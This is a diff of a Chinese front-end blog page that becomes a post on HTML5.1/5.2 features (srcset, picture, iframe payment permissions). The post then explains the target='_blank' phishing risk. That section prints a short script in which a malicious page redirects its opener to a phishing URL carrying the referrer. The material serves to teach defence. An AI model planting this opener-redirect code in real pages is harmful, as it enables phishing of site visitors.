@@ -12,7 +12,7 @@
     
     <title>
         
-            归档 | 
+            HTML5.1和HTML5.2的新特性 | 
         
         Xposean&#39;s Blog
     </title>
@@ -67,15 +67,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://xposean.xin">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="归档 | Xposean&#39;s Blog">
+    <meta property="og:title" content="HTML5.1和HTML5.2的新特性 | Xposean&#39;s Blog">
     <meta property="og:image" content="/img/favicon.png" />
     <meta property="og:description" content="做一个刚刚好的前端仔">
     
 
     
+        <meta property="article:published_time" content="3月 08, 2018" />
+        <meta property="article:modified_time" content="3月 08, 2018" />
+    
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="归档 | Xposean&#39;s Blog">
+    <meta name="twitter:title" content="HTML5.1和HTML5.2的新特性 | Xposean&#39;s Blog">
     <meta name="twitter:description" content="做一个刚刚好的前端仔">
     <meta name="twitter:image" content="/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -83,13 +86,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://xposean.xin/archives/index.html" />
+        <link rel="canonical" href="http://xposean.xin/2018/03/08/HTML5-1和HTML5-2的新特性/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Xposean&#39;s Blog",
+        "logo": "/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Xposean",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/favicon.png"
+        },
+        "description": "做一个刚刚好的前端仔,——关于我"
+    },
+    "headline": "HTML5.1和HTML5.2的新特性",
+    "url": "http://xposean.xin/2018/03/08/HTML5-1和HTML5-2的新特性/index.html",
+    "datePublished": "3月 08, 2018",
+    "dateModified": "3月 08, 2018",
+    "description": "做一个刚刚好的前端仔",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://xposean.xin"
+    }
+}
+</script>
 
 
     
@@ -412,25 +445,29 @@
 
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
     
 
-    <!-- Normal Post -->
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+
+
+    <!-- Isolation Post Header -->
+    <!-- Post thumbnail -->
     
         <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
+        <div class="post-header_info without-thumbnail">
             <!-- Author Avatar & Name -->
             <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
             <span class="name-span">Xposean</span>
@@ -441,591 +478,91 @@
     
         </div>
 
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/03/08/HTML5-1和HTML5-2的新特性/">HTML5.1和HTML5.2的新特性</a>
-        </p>
 
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                HTML5.1和HTML5.2提供很多新特性,但大部分都比较鸡肋,以下只列举部分有实际用处的特性.
 
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/03/08/HTML5-1和HTML5-2的新特性/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                3月 08, 2018
-            </div>
-            <div class="post_entry-footer-comment">
                 
-                
-            </div>
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+
+    
+        <div class="post-content_wrapper">
+            <p class="post-title">
+                HTML5.1和HTML5.2的新特性
+            </p>
+            <p>HTML5.1和HTML5.2提供很多新特性,但大部分都比较鸡肋,以下只列举部分有实际用处的特性.</p>
+<h3 id="1-为响应设计定义多个图像资源"><a href="#1-为响应设计定义多个图像资源" class="headerlink" title="1.为响应设计定义多个图像资源"></a>1.为响应设计定义多个图像资源</h3><h4 id="srcset-图像属性"><a href="#srcset-图像属性" class="headerlink" title="srcset 图像属性"></a>srcset 图像属性</h4><pre><code>srcset 属性让你可以指定一个多个可选的图像来源，对应于不同的像素分辨率。它将允许浏览器根据用户设备的不同选择合适质量的实现来进行显示。例如，对于使用网络比较慢的移动设备的用户，显示一张低分辨率的图片会比较好。
+
+你可以使用 srcset 属性并且带上它自有的 x 修饰符来描述每一个图片的像素比例, 如果用户的像素比例等于 3，就会显示 high-res 这张图片。
+
+&lt;img src=&quot;clicks/low-res.jpg&quot; srcset=&quot;clicks/low-res.jpg 500w, clicks/medium-res.jpg 1000w,clicks/high-res.jpg 1600w&quot;&gt;
+</code></pre><h4 id="picture标签"><a href="#picture标签" class="headerlink" title="picture标签"></a>picture标签</h4><pre><code>&lt;picture&gt; 
+    &lt;source srcset=&quot;mobile.jpg, mobile-hd.jpg 2x&quot; media=&quot;(max-width: 360px)&quot;&gt; 
+    &lt;source srcset=&quot;large.jpg, large-hd.jpg 2x&quot; media=&quot;(min-width: 1920px)&quot;&gt; 
+    &lt;img src=&quot;default.jpg&quot; srcset=&quot;default-hd.jpg 2x&quot; alt=&quot;your image&quot;&gt; 
+&lt;/picture&gt;
+</code></pre><h3 id="2-iframe支持更多的权限"><a href="#2-iframe支持更多的权限" class="headerlink" title="2.iframe支持更多的权限"></a>2.iframe支持更多的权限</h3><h4 id="iFrame可以使用支付请求接口-allowpaymentrequest"><a href="#iFrame可以使用支付请求接口-allowpaymentrequest" class="headerlink" title="iFrame可以使用支付请求接口 allowpaymentrequest"></a>iFrame可以使用支付请求接口 allowpaymentrequest</h4><p>在HTML5.2之前.对于支付请求的API是不能在iframe中来完成的.所以每次我们在进行移动支付时都需要跳转到另外一个支付页面才能完成付款.而现在,使用allowpaymentrequest属性应用在iframe上</p>
+<pre><code>&lt;iframe allowpaymentrequest&gt;
+</code></pre><p>这样,就可以让iframe使用<code>Payment Request API</code>从而让</p>
+<p>嵌入了第三方内容的页面能够控制该第三方内容是否可向用户请求获取支付凭证，进而让可嵌入的购物车工具可以利用Payment Request API。</p>
+<p>来自Forrester的Brendan Miller阐述了支付请求API所带来的好处，他说：该新标准让开发者可以创建一个简化的结帐页面，用户可以重复使用保存的付款和地址信息来加快结账速度，并减少错误输入。</p>
+<p>Payment Request API的兼容性:<br><img src="https://i.imgur.com/gm6lz5c.png" alt=""></p>
+<h3 id="解决”-blank”的钓鱼攻击"><a href="#解决”-blank”的钓鱼攻击" class="headerlink" title="解决”_blank”的钓鱼攻击"></a>解决”_blank”的钓鱼攻击</h3><blockquote>
+<p>在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。</p>
+<p>然而，就是这个属性，为钓鱼攻击者带来了可乘之机。</p>
+</blockquote>
+<h4 id="parent-与-opener"><a href="#parent-与-opener" class="headerlink" title="parent 与 opener"></a>parent 与 opener</h4><p>在说 <code>opener</code> 之前，可以先聊聊 <code>&lt;iframe&gt;</code> 中的 <code>parent</code>。<br>我们知道，在 <code>&lt;iframe&gt;</code>中提供了一个用于父子页面交互的对象，叫做 <code>window.parent</code>，我们可以通过 <code>window.paren</code>t 对象来从框架中的页面访问父级页面的 <code>window</code>。<br><code>opener</code> 与 <code>parent</code> 一样，只不过是用于 <code>&lt;a target=&quot;_blank&quot;&gt;</code> 在新标签页打开的页面的。通过<br><code>&lt;a target=&quot;_blank&quot;&gt;</code> 打开的页面，可以直接使用 <code>window.opener</code> 来访问来源页面的 <code>window</code> 对象。</p>
+<h4 id="重述攻击步骤"><a href="#重述攻击步骤" class="headerlink" title="重述攻击步骤"></a>重述攻击步骤</h4><p>1.在你的网站 <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> 上存在一个链接：<br>    <a href="https://an.evil.site" target="_blank">进入一个“邪恶”的网站</a></p>
+<p>当用户点击了这个链接，在新的标签页打开了这个网站。这个网站上只要包含着类似于这样的 JavaScript 代码：</p>
+<pre><code>&lt;script type=&apos;text/javascript&apos;&gt;
+    if  (window.opener)  {
+      window.opener.location  =  &apos;http://www.two.com/phishing-referrer=&apos;+document.referrer;
+    }
+&lt;/script&gt;
+</code></pre><p>那么此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 </p>
+<p>恶意网站 <a href="https://a.fake.site" target="_blank" rel="noopener">https://a.fake.site</a> 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。</p>
+<p>用户关闭 <a href="https://an.evil.site" target="_blank" rel="noopener">https://an.evil.site</a> 的标签页，回到原来的网站………………已经回不去了。</p>
+
         </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/03/08/你知道吗-浏览器也有数据库/">你知道吗?浏览器也有数据库</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                对于浏览器的存储,大家所熟知的要么就是cookie、SessionStorage或者...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/03/08/你知道吗-浏览器也有数据库/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                3月 08, 2018
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/02/27/移动设备引发的一像素边框问题/">移动设备引发的一像素边框问题</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                熟悉移动web开发的同学一定对1像素边框问题不陌生,随着移动端web项目越来越多,要求也越来越高，好多设计师都发现...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/02/27/移动设备引发的一像素边框问题/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                2月 27, 2018
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/02/08/微信小程序生态数据分析和报告/">微信小程序生态数据分析和报告</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                以下数据来源于 
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/02/08/微信小程序生态数据分析和报告/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                2月 08, 2018
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/01/24/来聊聊优雅的icon/">来聊聊优雅的Icon</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                前言在做前端后台项...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/01/24/来聊聊优雅的icon/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                1月 24, 2018
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/01/17/浅谈前后端开发中的MVVM开发模式/">浅谈前后端开发中的MVVM开发模式</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                之前在我的博客也写过关于MVVM模式的简单介绍,但不够详细,也因为对 MVVM 模式一直只是模模糊糊的认识，现在就给大家讲一下详细讲下MVVM模式为...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/01/17/浅谈前后端开发中的MVVM开发模式/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                1月 17, 2018
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2018/01/09/PWA的Service-Worker/">PWA的Service Worker</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                PWA(Progressive Web Apps,渐进式增强 WEB 应用)由谷歌提出，用前沿的技术开发，让网页使...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2018/01/09/PWA的Service-Worker/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                1月 09, 2018
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2017/12/30/深入研究微信小程序的wepy框架/">深入研究微信小程序的wepy框架</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                小程序现状
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2017/12/30/深入研究微信小程序的wepy框架/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                12月 30, 2017
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2017/12/25/深拷贝与浅拷贝/">JavaScript的深拷贝与浅拷贝</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                在掌握深浅拷贝前,我们要知道,JavaScript的变量可以分为以下两种类型：
-
-基本类型...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2017/12/25/深拷贝与浅拷贝/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                12月 25, 2017
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-        
-            
-            
-                <!-- Isolation Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post_entry Header -->
-    
-        <!-- Post Header Info -->
-        <div class="post_entry-header_info without-thumbnail">
-            <!-- Author Avatar & Name -->
-            <img src="/img/avatar.png" class="avatar-img" width="44px" height="44px" alt="Xposean's avatar">
-            <span class="name-span">Xposean</span>
-        </div>
-
-        <!-- Null Thumbnail -->
-        <div class="post_thumbnail-null">
-    
-        </div>
-
-    <!-- Post_entry Content -->
-    <div class="post_entry-content mdl-color-text--grey-600 mdl-card__supporting-text">
-        <!-- Post Title -->
-        <p class="post_entry-title">
-            <a href="/2017/12/19/谈谈现在的移动端页面调试/">谈谈现在的移动端页面调试</a>
-        </p>
-
-        <!-- Post Excerpt -->
-        <p class="post_entry-excerpt">
-            
-                通常我们在日常开发手机版网页的时候，都是通过PC浏览器的移动设备模式来模拟移动设备访问网页,但总会出现以下的问题:
-开发时，在自己电脑...
-            
-            &nbsp;&nbsp;&nbsp;
-            <span>
-                <a href="/2017/12/19/谈谈现在的移动端页面调试/" target="_self">阅读全文</a>
-            </span>
-        </p>
-
-        <!-- Post Tags -->
-        
-    </div>
-
-    <!-- Post_entry Footer -->
-    <div class="post_entry-footer">
-        <div class="post_entry-footer-border"></div>
-        <div class="post_entry-footer-info">
-            <div class="post_entry-footer-date">
-                12月 19, 2017
-            </div>
-            <div class="post_entry-footer-comment">
-                
-                
-            </div>
-        </div>
-    </div>
-</div><script type="text/javascript" color="0,0,0" opacity='0.9' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
-
-            
-        
-    
-
-    
-    <!-- Index nav -->
-        <nav class="material-nav mdl-cell mdl-cell--12-col">
-            <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/"><button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"><i class="material-icons" role="presentation">arrow_forward</i></button></a>
-        </nav>
-    
-
     
 </div>
+
+
+                
+                    <!-- Paradox Post Info -->
+                    
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/03/08/你知道吗-浏览器也有数据库/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
